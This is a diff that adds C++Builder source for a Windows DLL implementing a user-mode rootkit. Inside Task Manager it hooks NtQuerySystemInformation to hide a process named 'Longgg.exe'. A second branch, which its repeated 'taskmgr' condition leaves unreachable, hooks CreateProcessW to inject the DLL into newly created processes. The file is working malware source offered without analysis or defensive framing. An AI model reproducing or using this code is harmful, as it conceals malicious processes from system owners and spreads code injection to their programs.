@@ -1,0 +1,153 @@
+﻿#include <vcl.h>
+#include "MyFuction.h"
+#include "Winternl.h"
+HINSTANCE g_hinstDll;
+String MyPath ;
+String CurrentProcessPath ;
+
+#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)
+
+
+AnsiString HideProcessName ="Longgg.exe";
+HANDLE m_hMapFile ;
+long lpMapAddr;
+
+long __declspec(naked) WINAPI RealNtQuerySystemInformation(
+	SYSTEM_INFORMATION_CLASS SystemInformationClass,
+	PVOID SystemInformation,
+	ULONG SystemInformationLength,
+	PULONG ReturnLength OPTIONAL)
+{
+	asm{
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+		nop
+	}
+}
+
+SYSTEM_PROCESS_INFORMATION  *pCurrent;
+SYSTEM_PROCESS_INFORMATION  *pPrev;
+
+long  WINAPI MyNtQuerySystemInformation(
+   SYSTEM_INFORMATION_CLASS SystemInformationClass,PVOID SystemInformation,
+	ULONG SystemInformationLength,PULONG ReturnLength OPTIONAL){
+
+
+	long BackReturn = RealNtQuerySystemInformation(SystemInformationClass,SystemInformation,
+					  SystemInformationLength,ReturnLength);
+	if (NT_SUCCESS(BackReturn))
+	{
+
+	if (SystemInformationClass == SystemProcessInformation) {
+	pCurrent = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+			while (1){
+					if(pCurrent->UniqueProcessId != 0) {
+
+					UNICODE_STRING pszImageName = *(UNICODE_STRING*)((long)pCurrent + 0x38);
+					AnsiString n = pszImageName.Buffer;
+
+						if( lstrcmpi( n.c_str() , HideProcessName.c_str()  ) == 0)
+						{
+							if (pCurrent->NextEntryOffset == NULL)
+							{
+								pPrev->NextEntryOffset =0;
+							}
+							else
+							{
+								pPrev->NextEntryOffset += pCurrent->NextEntryOffset;
+							}
+
+						}else
+						{
+							pPrev = pCurrent;
+						}
+					}
+					if(pCurrent->NextEntryOffset == 0) break;
+					pCurrent = (SYSTEM_PROCESS_INFORMATION*)((long)pCurrent + pCurrent->NextEntryOffset);
+			}
+
+		}
+	}
+
+
+	return BackReturn;
+	}
+
+////////////////////////////////////////////////////////////////////////////////////////////////////
+/*Hook CreateProcessW*/
+long CreateProcessW__ReturnAdr;
+HANDLE WINAPI __declspec(naked) NormalCreateProcessW(  LPCWSTR lpApplicationName, LPWSTR lpCommandLine,LPSECURITY_ATTRIBUTES lpProcessAttributes,LPSECURITY_ATTRIBUTES lpThreadAttributes,
+	BOOL bInheritHandles, DWORD dwCreationFlags, LPVOID lpEnvironment, LPCWSTR lpCurrentDirectory, LPSTARTUPINFOW lpStartupInfo, LPPROCESS_INFORMATION lpProcessInformation){
+	asm{
+		mov edi,edi
+		push ebp
+		mov ebp,esp
+		jmp dword ptr [CreateProcessW__ReturnAdr]
+	}
+}
+
+
+BOOL WINAPI NewCreateProcessW(
+LPCWSTR lpApplicationName,
+LPWSTR lpCommandLine,
+LPSECURITY_ATTRIBUTES lpProcessAttributes,
+LPSECURITY_ATTRIBUTES lpThreadAttributes,
+BOOL bInheritHandles,
+DWORD dwCreationFlags,
+LPVOID lpEnvironment,
+LPCWSTR lpCurrentDirectory,
+LPSTARTUPINFOW lpStartupInfo,
+LPPROCESS_INFORMATION lpProcessInformation){
+
+bool GetRet = NormalCreateProcessW(lpApplicationName,lpCommandLine,
+lpProcessAttributes,lpThreadAttributes,bInheritHandles,
+CREATE_SUSPENDED, lpEnvironment,lpCurrentDirectory,lpStartupInfo, lpProcessInformation);
+			 //
+	InjectDll(MyPath,lpProcessInformation->hProcess);
+
+  ResumeThread(lpProcessInformation->hThread );
+return GetRet;
+}
+/////////////////////////////////////////////////////////////////////////////////////////////////////
+
+/*Dll Main*/
+
+
+int WINAPI DllEntryPoint(HINSTANCE hinst, unsigned long reason, void* lpReserved){
+	if(reason == DLL_PROCESS_ATTACH){
+		g_hinstDll = hinst;
+		MyPath = String(GetMyPath(hinst));
+		CurrentProcessPath = (Application->ExeName);
+
+		if (CurrentProcessPath.LowerCase().Pos("taskmgr") > 0)
+		{
+			long NtQuerySystemInformationADR = (long)GetProcAddress(GetModuleHandle("NtDll"),AnsiString("NtQuerySystemInformation").c_str())  ;
+			MEMwrite((void*)RealNtQuerySystemInformation,(void*)NtQuerySystemInformationADR,16);
+			AsmJump(NtQuerySystemInformationADR,MyNtQuerySystemInformation,0);
+	   }
+	   else if (CurrentProcessPath.LowerCase().Pos("taskmgr") > 0)
+	   {
+			CreateProcessW__ReturnAdr = (long)GetProcAddress(GetModuleHandle("Kernel32"),AnsiString("CreateProcessW").c_str())+5  ;
+			AsmJump(CreateProcessW__ReturnAdr-5,NewCreateProcessW,0);
+	   }
+
+
+
+	}else if(reason == DLL_PROCESS_DETACH){
+
+	}
+	return true;
+}
